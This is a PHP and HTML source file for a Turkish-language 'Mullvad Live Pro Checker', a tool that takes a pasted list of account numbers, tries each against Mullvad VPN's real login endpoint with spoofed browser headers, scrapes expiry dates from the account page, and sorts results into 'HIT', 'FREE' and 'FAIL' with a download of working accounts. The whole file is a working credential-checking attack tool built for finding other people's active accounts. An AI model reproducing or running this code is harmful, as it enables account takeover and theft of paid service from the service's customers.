<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    
    $user = $_POST['user'] ?? '';
    
    function request($url, $post = null, $headers = [], $cookieStr = "") {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_ENCODING, ""); 
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        if ($post !== null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if (!empty($cookieStr)) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookieStr);
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $response = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($response, 0, $header_size);
        $body = substr($response, $header_size);
        
        curl_close($ch);
        return ['header' => $header, 'body' => $body];
    }

    $h1 = [
        "host: mullvad.net",
        "accept: application/json",
        "accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type: application/x-www-form-urlencoded",
        "origin: https://mullvad.net",
        "referer: https://mullvad.net/tr/account/login?next=%2Ftr%2Faccount%2Fdevices",
        "sec-ch-ua: \"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Google Chrome\";v=\"146\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "x-sveltekit-action: true"
    ];
    $p1 = "account_number=" . urlencode($user);
    
    $res1 = request("https://mullvad.net/tr/account/login?next=%2Ftr%2Faccount%2Fdevices", $p1, $h1);
    $body1 = $res1['body'];
    $header1 = $res1['header'];

    if (strpos($body1, '{"type":"failure"') !== false) {
        echo json_encode(['status' => 'fail', 'user' => $user]);
        exit;
    }

    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header1, $matches);
    $cookies = [];
    foreach($matches[1] as $item) {
        parse_str($item, $cookie);
        foreach($cookie as $k => $v) {
            $cookies[$k] = $v;
        }
    }
    $cookieStr = "";
    foreach($cookies as $k => $v) {
        $cookieStr .= "$k=$v; ";
    }

    if (strpos($cookieStr, 'accessToken') !== false || strpos($body1, '{"type":"redirect"') !== false || strpos($body1, '"status":302') !== false) {
        
        $h2 = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma: no-cache",
            "Accept: */*"
        ];
        
        $res2 = request("https://mullvad.net/tr/account/devices", null, $h2, $cookieStr);
        $body2 = $res2['body'];

        $expiryDate = 'Bilinmiyor';
        if (preg_match('/cy="account-expiry"\s*datetime="([^"]+)"/', $body2, $match1)) {
            $expiryDate = $match1[1];
        }

        $accStatus = 'Bilinmiyor';
        if (preg_match('/data-cy="account-expiry">([^<]+)<\/p>/', $body2, $match2)) {
            $accStatus = trim($match2[1]);
        }

        echo json_encode([
            'status' => 'success',
            'user' => $user,
            'expiry' => $expiryDate,
            'acc_status' => $accStatus
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Mullvad Live Pro Checker</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #06090f; --card: #0d1117; --primary: #2f81f7; --success: #2ea043; --danger: #f85149; --warning: #d29922; --border: #30363d; --text: #f0f6fc; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; }
        .container { max-width: 1400px; margin: 0 auto; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
        /* Kart sayısı 4 olduğu için repeat(4, 1fr) yapıldı */
        .header-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: var(--card); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; }
        .stat-card b { display: block; font-size: 24px; margin-top: 5px; }
        .main-grid { display: grid; grid-template-columns: 1fr 2.5fr; gap: 20px; }
        textarea { width: 100%; height: 250px; background: #161b22; border: 1px solid var(--border); border-radius: 10px; color: #58a6ff; padding: 10px; font-family: monospace; outline: none; margin-bottom: 10px; resize: none; }
        .scroll-box { height: 500px; overflow-y: auto; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 15px; padding: 15px; }
        .hit-item { background: var(--card); border: 1px solid var(--success); border-radius: 10px; padding: 15px; margin-bottom: 10px; position: relative; }
        .log-line { font-size: 11px; padding: 5px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; }
        .btn { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; margin-bottom: 10px; transition: 0.3s; text-decoration: none; display: inline-block; text-align: center; }
        .btn-outline { background: transparent; border: 1px solid var(--border); width: auto; padding: 10px 20px; }
        .btn-outline:hover { background: var(--border); }
        .btn-danger { background: var(--danger); }
        .btn-success { background: var(--success); margin-bottom: 15px; }
        .tag { font-size: 10px; padding: 2px 5px; border-radius: 4px; background: #21262d; color: var(--text); }
        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="container">
    <nav class="navbar">
        <div class="logo">
            <i class="fas fa-shield-halved" style="color:var(--primary)"></i>
            <span style="font-weight:800; margin-left: 8px;">MULLVAD <span style="color:var(--primary)">LIVE</span> PRO</span>
        </div>
        <a href="index.php" class="btn btn-outline">
            <i class="fas fa-arrow-left"></i> GERİ DÖN
        </a>
    </nav>

    <div class="header-stats">
        <div class="stat-card" style="border-top: 4px solid var(--primary);">KALAN <b id="s_total">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--success);">HIT <b id="s_hit">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--warning);">FREE <b id="s_free">0</b></div>
        <div class="stat-card" style="border-top: 4px solid var(--danger);">FAIL <b id="s_fail">0</b></div>
    </div>

    <div class="main-grid">
        <div class="side-panel">
            <textarea id="accs" placeholder="Hesaplar (Sadece Numara veya user:pass)"></textarea>
            <button id="actionBtn" onclick="toggleProcess()" class="btn">TARAMAYI BAŞLAT</button>
            <div class="scroll-box" id="fullLog" style="height: 300px;"></div>
        </div>

        <div class="hit-panel">
            <button onclick="downloadHits()" id="dlBtn" class="btn btn-success" style="display:none;">HİT HESAPLARI İNDİR (.TXT)</button>
            <div class="scroll-box" id="hitLog" style="height: 610px;"></div>
        </div>
    </div>
</div>

<script>
let hitList = [];
let isRunning = false;

function downloadHits() {
    if(hitList.length === 0) return;
    let content = hitList.map(h => `Hesap: ${h.user} | Bitiş: ${h.expiry} | Durum: ${h.acc_status}`).join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Mullvad_Hits_${new Date().getTime()}.txt`;
    a.click();
}

function renderHits() {
    const hitsBox = document.getElementById('hitLog');
    hitsBox.innerHTML = '';
    hitList.forEach(res => {
        hitsBox.innerHTML += `
        <div class="hit-item" style="animation: slideIn 0.3s ease;">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <b style="color:var(--primary)">${res.user}</b>
                <span class="tag" style="color:var(--success)">Aktif / Hit</span>
            </div>
            <div style="display:grid; grid-template-columns: repeat(2, 1fr); gap:10px; font-size:11px;">
                <div><small style="display:block; color:#8b949e">DURUM</small><b style="color:var(--success)">${res.acc_status !== 'Bilinmiyor' ? res.acc_status : 'Aktif'}</b></div>
                <div><small style="display:block; color:#8b949e">BİTİŞ TARİHİ</small><b>${res.expiry}</b></div>
            </div>
        </div>`;
    });
}

function toggleProcess() {
    if (isRunning) {
        isRunning = false;
        document.getElementById('actionBtn').innerText = "TARAMAYI BAŞLAT";
        document.getElementById('actionBtn').classList.remove('btn-danger');
    } else {
        process();
    }
}

async function process() {
    const accs = document.getElementById('accs').value.split('\n').filter(l => l.trim() !== '');

    if(!accs.length) return alert("Hesap listesi boş!");

    isRunning = true;
    const btn = document.getElementById('actionBtn');
    btn.innerText = "DURDUR";
    btn.classList.add('btn-danger');

    let hits = 0, frees = 0, fails = 0;
    hitList = [];
    document.getElementById('hitLog').innerHTML = '';
    document.getElementById('fullLog').innerHTML = '';
    
    document.getElementById('s_hit').innerText = "0";
    document.getElementById('s_free').innerText = "0";
    document.getElementById('s_fail').innerText = "0";

    for (let i = 0; i < accs.length; i++) {
        if (!isRunning) break;

        document.getElementById('s_total').innerText = accs.length - i;
        
        let line = accs[i].trim();
        let u = line;
        if(line.includes(':')) {
            u = line.split(':')[0];
        }

        const fd = new FormData();
        fd.append('user', u);

        try {
            const response = await fetch('?action=check', { method: 'POST', body: fd });
            const res = await response.json();
            const log = document.getElementById('fullLog');

            if(res.status === 'success') {
                let statusText = res.acc_status.toLowerCase();
                
                if (statusText.includes("sona erdi") || statusText.includes("expired") || res.expiry === 'Bilinmiyor') {
                    frees++;
                    document.getElementById('s_free').innerText = frees;
                    let msg = res.acc_status !== 'Bilinmiyor' ? res.acc_status : "Süre sona erdi";
                    log.innerHTML = `<div class="log-line"><span style="color:var(--warning)">[FREE] ${u}</span> <span>${msg}</span></div>` + log.innerHTML;
                } else {
                    hits++; 
                    document.getElementById('s_hit').innerText = hits;
                    document.getElementById('dlBtn').style.display = 'block';
                    log.innerHTML = `<div class="log-line"><span style="color:var(--success)">[HIT] ${u}</span> <span>${res.expiry}</span></div>` + log.innerHTML;
                    hitList.push(res);
                    renderHits();
                }
            } else {
                fails++; 
                document.getElementById('s_fail').innerText = fails;
                log.innerHTML = `<div class="log-line"><span style="color:var(--danger)">[FAIL] ${u}</span></div>` + log.innerHTML;
            }
        } catch (e) { console.error(e); }
    }

    isRunning = false;
    btn.innerText = "TARAMAYI BAŞLAT";
    btn.classList.remove('btn-danger');
    document.getElementById('s_total').innerText = "BİTTİ";
}
</script>
</body>
</html>